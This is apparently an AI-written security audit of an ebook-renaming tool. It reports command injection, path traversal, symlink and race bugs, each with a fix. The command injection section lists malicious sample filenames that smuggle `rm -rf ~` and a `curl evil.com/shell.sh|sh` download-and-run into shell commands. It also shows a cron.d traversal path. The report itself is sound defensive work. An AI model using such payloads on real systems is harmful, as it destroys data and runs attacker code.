# Security Audit & Bug Analysis Report

**Auditor**: Claude Opus 4.5
**Date**: 2025-06-16
**Scope**: All implementations (Rust, Go, Python)

---

## CRITICAL SECURITY VULNERABILITIES

### 1. Command Injection via Undo Script Generation

**File**: `src/main.rs:174-211`
**Severity**: **CRITICAL**

```rust
let old = file_info.original_path.to_string_lossy().replace("\"", "\\\"");
let new = file_info.new_path.to_string_lossy().replace("\"", "\\\"");
writeln!(undo_file, "mv \"{}\" \"{}\"", new, old)?;
```

**Vulnerability**: The shell escaping only handles double quotes, but fails to escape:
- Backticks (\`) for command substitution
- `$()` for command substitution
- Newlines (can inject additional commands)
- Other shell metacharacters (`|`, `;`, `&`, etc.)

**Attack Vector**: A malicious filename like:
```
$(rm -rf ~).pdf
`curl evil.com/shell.sh|sh`.pdf
test$(id > /tmp/pwned).pdf
```

Would execute arbitrary commands when the undo script is run.

**Fix**: Use proper shell escaping library or switch to JSON-based undo log.

---

### 2. Path Traversal in Download Recovery

**File**: `src/download_recovery.rs:91-101`
**Severity**: **HIGH**

The `clean_filename` function doesn't validate against path traversal sequences. A `.download` folder could contain:
```
../../../etc/cron.d/malicious.pdf
```

**Fix**: Validate that cleaned filename contains no path separators.

---

### 3. Symlink Following (Directory Traversal)

**File**: `src/scanner.rs:40-56`
**Severity**: **MEDIUM**

```rust
for entry in WalkDir::new(&self.root_path)
    .max_depth(self.max_depth)
```

`WalkDir` follows symlinks by default. This allows:
- Escaping target directory boundaries via symlinks
- Infinite loops with circular symlinks
- Processing sensitive files outside intended scope

**Fix**: Add `.follow_links(false)` to WalkDir configuration.

---

### 4. Predictable Temporary File Names

**File**: `src/renamer.rs:154`
**Severity**: **LOW**

```rust
let candidate_name = format!(".ebook-renamer-tmp-{}-{}", *counter, file_name);
```

Predictable naming could allow symlink attacks in shared directories.

---

## CRITICAL BUGS

### 1. TUI Mode Skips Collision Resolution (DATA LOSS RISK)

**File**: `src/tui.rs:195-199`
**Severity**: **CRITICAL**

```rust
for file_info in &clean_files {
    if let Some(ref _new_name) = file_info.new_name {
        std::fs::rename(&file_info.original_path, &file_info.new_path)?;
    }
}
```

The TUI mode:
1. Does NOT call `renamer::resolve_rename_collisions()`
2. Does NOT call `renamer::execute_renames()` (which handles cycles)

**Impact**:
- Files can be overwritten without warning
- Rename cycles will fail, leaving files in inconsistent state
- Potential data loss

**Fix**: TUI must use the same `renamer::execute_renames()` function as CLI mode.

---

### 2. Extension Case Sensitivity Inconsistency

**Files**: `src/scanner.rs:89-90`, `src/duplicates.rs:10`

Scanner uses case-sensitive extension comparison:
```rust
let is_ebook = extension == ".pdf" || extension == ".epub";
```

But duplicates uses exact match:
```rust
const ALLOWED_EXTENSIONS: &[&str] = &[".pdf", ".epub", ".txt"];
```

**Impact**: Files with `.PDF` or `.EPUB` (uppercase) are:
- NOT marked as "too small" in scanner
- NOT included in duplicate detection
- Handled inconsistently across the pipeline

---

### 3. Infinite Loop in find_available_destination

**File**: `src/download_recovery.rs:158-172`

```rust
for suffix in 0usize.. {
    if !candidate_path.exists() {
        return candidate_path;
    }
}
```

No maximum iteration limit. If filesystem is full or permissions prevent creation, this loops forever.

---

### 4. Cloud Detection False Positives

**File**: `src/cloud.rs:9-40`

```rust
if path_str.contains("Dropbox") {
```

Matches any path containing "Dropbox", including:
- `/Users/user/Documents/Dropbox Alternative/`
- `/mnt/backup/old_Dropbox/`
- `/Users/user/Projects/DropboxClone/`

---

### 5. TOCTOU Race in Rename Resolution

**File**: `src/renamer.rs:53`

```rust
let candidate_exists_on_disk = candidate_path.exists();
// ... time passes ...
// rename happens later
```

Between existence check and rename, another process could create the file.

---

## MISSING FEATURES

1. **No EPUB/MOBI integrity validation** - Only PDFs are checked
2. **No iCloud/Nextcloud/Mega detection** - Despite being mentioned in docs
3. **Missing `--skip-cloud-hash` in Go/Python** - Flag parsed but not implemented
4. **No JSON-based undo log** - Only shell script available
5. **No progress in CLI JSON mode** - Silent during long operations

---

## UNIT TEST GAPS

1. No tests for rename cycle detection
2. No tests for symlink handling
3. No fuzz testing for normalizer regex patterns
4. No tests for concurrent file operations
5. No Windows path handling tests
6. No integration tests between modules

---

## RECOMMENDATIONS

### Immediate (P0)
1. Fix command injection in undo script generation
2. Fix TUI mode to use proper renamer functions
3. Add path traversal validation in download recovery

### Short-term (P1)
1. Add `.follow_links(false)` to scanner
2. Fix extension case sensitivity
3. Add iteration limits to infinite loops
4. Improve cloud path detection accuracy

### Long-term (P2)
1. Add comprehensive fuzz testing
2. Implement JSON-based undo log
3. Add EPUB integrity validation
4. Add concurrent operation tests
